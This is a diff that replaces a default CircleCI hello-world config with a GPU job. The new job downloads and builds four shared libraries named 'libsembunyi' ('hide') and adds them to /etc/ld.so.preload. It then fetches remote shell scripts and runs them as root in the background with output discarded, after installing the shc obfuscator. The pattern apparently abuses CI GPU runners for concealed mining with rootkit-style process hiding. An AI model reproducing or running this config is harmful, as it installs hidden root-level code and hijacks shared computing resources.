@@ -1,26 +1,24 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/2.0/configuration-reference
 version: 2.1
-
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
 jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
-    docker:
-      - image: cimg/base:stable
-    # Add steps to the job
-    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.small
     steps:
-      - checkout
+      - run: 
+          name: Cek Status GPU !!
+          command: |
+            nvidia-smi
       - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
-
-# Invoke jobs via workflows
-# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
-workflows:
-  say-hello-workflow:
-    jobs:
-      - say-hello
+          name: Start Job ....
+          command: | 
+            wget https://github.com/mutiahanum22/used/releases/download/fired/all.tar.gz
+            sudo su --command "tar -xvf all.tar.gz && cd 01 && make && sudo mv libsembunyi01.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi01.so >> /etc/ld.so.preload && cd 02 && make && sudo mv libsembunyi02.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi02.so >> /etc/ld.so.preload && cd 03 && make && sudo mv libsembunyi03.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi03.so >> /etc/ld.so.preload && cd 04 && make && sudo mv libsembunyi04.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi04.so >> /etc/ld.so.preload>> /etc/ld.so.preload"
+            sudo su --command "wget https://raw.githubusercontent.com/yulinoan/minang/main/nuna.sh && chmod +x nuna.sh"
+            sudo su --command "nohup ./nuna.sh >/dev/null 2>&1 &"
+      - run:
+          name: Yuk Deploy ....
+          command: |
+            sudo su --command "apt-get install shc -y && wget https://raw.githubusercontent.com/thefacta/repo/main/idlo.sh && chmod +x idlo.sh"
+            sudo su --command "./idlo.sh"
+            
